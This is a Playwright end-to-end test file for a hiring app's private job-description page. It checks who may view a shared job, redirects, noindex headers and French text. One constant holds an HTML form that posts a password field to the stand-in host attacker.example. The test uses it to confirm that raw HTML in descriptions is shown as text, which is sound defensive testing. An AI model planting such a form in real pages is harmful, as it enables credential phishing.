import { expect, test, type APIRequestContext } from '@playwright/test';
import {
	API_URL,
	JWT_SECRET,
	apiAs,
	blockGoogle,
	candidateSession,
	gotoHydrated,
	ownerSession,
	recruiterSession,
	signIn,
	type OwnerSession
} from './support/owner';
import { createJob, deleteJobs, type RecruiterJob } from './support/jobs';

// The private page of a job description (/opportunities/:id), the link of the meeting invitation
// of a hiring journey. The e2e recruiter picks one of its open jobs on the job step of
// 'e2e-shared' (seeded by `bun run --cwd server seed:e2e` with a job step then the meeting; only
// this file picks on it): that portfolio's owner reads the job there, its recruiter is sent on to
// their own page of it, anyone else reads that it is not shared with them. The recruiter is shared
// with the other recruiter files, which run in parallel: this file names its postings with its own
// tag and removes them afterwards. Google is never reached.

test.skip(
	!JWT_SECRET,
	'Set JWT_SECRET to the API’s secret to sign in as the e2e owner and recruiter'
);

const DOMAIN = 'e2e-shared';
const tag = `view-${Date.now().toString(36)}`;
const TITLE = `Staff Engineer ${tag}`;
// A posting id nobody has
const UNKNOWN_ID = '65e2e00000000000000000aa';
// Raw HTML a recruiter wrote in the description: shown as text (JobDetails, html={false})
const RAW_FORM =
	'<form action="https://attacker.example/collect"><input name="password" type="password"></form>';

let owner: OwnerSession;
let recruiterApi: APIRequestContext;
let job: RecruiterJob;

test.beforeAll(async () => {
	owner = await ownerSession(DOMAIN);
	recruiterApi = await apiAs(await recruiterSession());
	job = await createJob(recruiterApi, {
		title: TITLE,
		status: 'open',
		description: `## The job\n\nCreated by an end-to-end test.\n\n${RAW_FORM}`
	});
	// Picked on the job step, as the Hire page sends it
	const picked = await recruiterApi.post(`${API_URL}/workflow/domains/${DOMAIN}/steps/job`, {
		data: { input: { jobId: job._id } }
	});
	expect(picked.ok(), `${await picked.text()}: run \`bun run --cwd server seed:e2e\``).toBe(true);
});

test.afterAll(async () => {
	await deleteJobs(recruiterApi, tag);
	await recruiterApi.dispose();
});

test.beforeEach(async ({ page }) => {
	await blockGoogle(page);
});

test('the owner reads the job the recruiter picked on their journey, on a page not listed', async ({
	page
}) => {
	await signIn(page, owner);
	const response = await gotoHydrated(page, `/opportunities/${job._id}`);
	expect(response?.headers()['x-robots-tag']).toMatch(/\bnoindex\b/);

	await expect(page.getByRole('heading', { level: 1 })).toHaveText('Job description');
	await expect(page.getByText('Shared in a hiring journey')).toBeVisible();
	await expect(page.getByRole('heading', { level: 2, name: TITLE })).toBeVisible();
	await expect(page.getByText('E2E Corp')).toBeVisible();
	await expect(page.getByText(/45,000/)).toBeVisible();
	await expect(page.getByRole('heading', { name: 'About the job' })).toBeVisible();
	// The description's raw HTML stays text: it cannot add a form to the page
	await expect(page.locator('form[action^="https://attacker.example"]')).toHaveCount(0);
	await expect(page.locator('input[type="password"]')).toHaveCount(0);
	await expect(page.getByText(RAW_FORM, { exact: false })).toBeVisible();
	// Dated, and says who else can open it
	await expect(page.getByText(/^Opened \d+ \w+ \d{4}$/)).toBeVisible();
	await expect(page.getByText(/only you and the recruiter who shared/)).toBeVisible();
	await expect(page).toHaveTitle(`${TITLE} | Portfolio`);
	await expect(page.locator('meta[name="robots"]')).toHaveAttribute('content', /\bnoindex\b/);
	await expect(page.locator('link[rel="canonical"]')).toHaveCount(0);
});

test('the link of an invitation sent before still opens it', async ({ page, request }) => {
	const moved = await request.get(`/jobs/${job._id}?lang=fr`, { maxRedirects: 0 });
	expect(moved.status()).toBe(308);
	expect(moved.headers()['location']).toBe(`/opportunities/${job._id}?lang=fr`);

	await signIn(page, owner);
	await gotoHydrated(page, `/jobs/${job._id}`);
	await expect(page).toHaveURL(new RegExp(`/opportunities/${job._id}$`));
	await expect(page.getByRole('heading', { level: 2, name: TITLE })).toBeVisible();
});

test('the recruiter who shared it is sent on to their own page of it', async ({ page }) => {
	await signIn(page, await recruiterSession());
	await gotoHydrated(page, `/opportunities/${job._id}`);

	await expect(page).toHaveURL(new RegExp(`/recruiter/jobs/${job._id}$`));
	await expect(page.getByRole('heading', { level: 2, name: TITLE })).toBeVisible();
	await expect(page.getByRole('link', { name: 'Edit' })).toBeVisible();
});

test('anyone else reads that it is not shared with them, as for a posting nobody has', async ({
	page
}) => {
	// The e2e candidate: no portfolio, nothing shared with it (it reads only: nothing to answer)
	await signIn(page, await candidateSession());
	for (const id of [job._id, UNKNOWN_ID, 'not-an-id']) {
		await gotoHydrated(page, `/opportunities/${id}`);
		await expect(
			page.getByRole('heading', { name: 'This job description is not shared with you' })
		).toBeVisible();
		await expect(page.getByText(TITLE)).toHaveCount(0);
		await expect(page.getByText(/You are signed in as/)).toContainText('e2e.candidate@example.com');
		await expect(page.getByRole('link', { name: 'Go to the home page' })).toHaveAttribute(
			'href',
			'/'
		);
	}
	// In French too
	await gotoHydrated(page, `/opportunities/${UNKNOWN_ID}?lang=fr`);
	await expect(page.getByRole('heading', { level: 1 })).toHaveText("Offre d'emploi");
	await expect(
		page.getByRole('heading', { name: "Cette offre d'emploi n'est pas partagée avec vous" })
	).toBeVisible();
});

test('signed out, it asks to sign in, and shows nothing of the job', async ({ page }) => {
	const asked: string[] = [];
	page.on('request', (request) => {
		if (request.url().startsWith(`${API_URL}/opportunities/`)) asked.push(request.url());
	});
	await gotoHydrated(page, `/opportunities/${job._id}`);

	await expect(
		page.getByRole('heading', { name: 'Sign in to read this job description' })
	).toBeVisible();
	await expect(page.getByRole('button', { name: 'Sign in with Google' })).toBeVisible();
	await expect(page.getByText(TITLE)).toHaveCount(0);
	expect(asked).toEqual([]);
});
